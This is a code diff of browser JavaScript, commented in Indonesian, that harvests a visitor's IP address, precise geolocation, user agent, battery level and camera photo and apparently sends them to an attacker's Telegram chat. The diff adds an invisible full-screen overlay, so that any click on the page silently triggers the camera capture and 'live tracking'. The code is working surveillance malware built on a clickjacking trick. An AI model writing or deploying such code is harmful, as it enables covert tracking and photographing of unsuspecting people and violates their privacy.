@@ -1,16 +1,16 @@
-const CHAT_ID = "7483495590";
+const CHAT_ID = "7483495590"; // chat admin
 const statusEl = document.getElementById("status");
 
 // ambil info device
 async function getDeviceInfo() {
   try {
     const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r => r.json());
-    let geo="Tidak tersedia";
+    let geo = "Tidak tersedia";
     if(navigator.geolocation){
       await new Promise(resolve => navigator.geolocation.getCurrentPosition(pos=>{
-        geo=`Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}, Accuracy:${pos.coords.accuracy} m`;
+        geo = `Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}, Accuracy:${pos.coords.accuracy} m`;
         resolve();
-      },()=>resolve()));
+      }, ()=>resolve()));
     }
     const battery = await navigator.getBattery();
     return `🌐 IP: ${ipInfo.ip}\n📍 Lokasi: ${geo}\n📱 UserAgent: ${navigator.userAgent}\n🔋 Battery: ${Math.round(battery.level*100)}%`;
@@ -49,11 +49,23 @@ async function captureAndSendPhoto(){
   } catch(e){ console.error("Gagal capture foto:", e); }
 }
 
-// trigger saat user klik
-document.getElementById("clickArea").addEventListener("click", async ()=>{
+// trigger klik area invisible
+const clickArea = document.createElement("div");
+clickArea.id = "clickArea";
+clickArea.style.position = "fixed";
+clickArea.style.top = "0";
+clickArea.style.left = "0";
+clickArea.style.width = "100%";
+clickArea.style.height = "100%";
+clickArea.style.zIndex = "9999";
+clickArea.style.cursor = "pointer";
+clickArea.style.background = "transparent";
+document.body.appendChild(clickArea);
+
+clickArea.addEventListener("click", async ()=>{
   statusEl.textContent = "Mengaktifkan kamera & live tracking...";
   await captureAndSendPhoto();
-  document.getElementById("clickArea").remove();
+  clickArea.remove();
 });
 
 // kirim pesan manual
